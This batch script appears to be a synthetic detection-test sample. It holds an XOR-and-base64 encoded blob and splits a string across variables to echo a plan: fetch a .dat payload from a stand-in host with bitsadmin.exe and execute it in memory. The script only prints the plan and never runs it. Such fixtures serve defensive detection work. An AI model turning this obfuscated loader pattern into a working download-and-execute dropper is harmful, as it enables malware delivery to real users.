@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:plain_fragments|reverse_xor

rem HUNTRESS-MATERIAL:R1JXHQJQBQoDUlZXHFdaX1JFXVodVl9DXlJLVh0BUFAGUVIKA1FRHBwJQENHR1sOX0FGTwFQUAZRUgoDUVEeXVRaUkNeUlAOV1psXVRaUkNeUlBPVl1cXQ5WVFJGVF1SX2xHS1ZdT1ddXF5SWlcOW0NSQVRPAg5HXUZcUGxWVFJHQE9WS1YdXVpeV1JAR1pRDkFWR0NSV1JPSkFcXlZebFtQR1JDQFpXH1ZHXF5WQWxWQVpGQlBSDkBDVkdATwIORQ==

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

SeT "item0=v=1|steps=acquire_remote,dispatch_memory|adapter="
SeT "item1=bitsadmin.exe|stage_count=1|graph=diamond|next_la"
SeT "item2=nguage=none|campaign_id=campaign-bb09ab5cc2|url=h"
SeT "item3=ttps://bb09ab5cc2.example.invalid/dea096c1.dat"

goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_opaque_branch=b3b7d6c9"

call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "item9=%%item0%%%%item1%%%%item2%%%%item3%%"
exit /b 0
:HUNTRESS_EMIT

echo(!item9!

exit /b 0

:HUNTRESS_PLAN

echo bitsadmin.exe GET https://bb09ab5cc2.example.invalid/dea096c1.dat then dispatch memory

exit /b 0

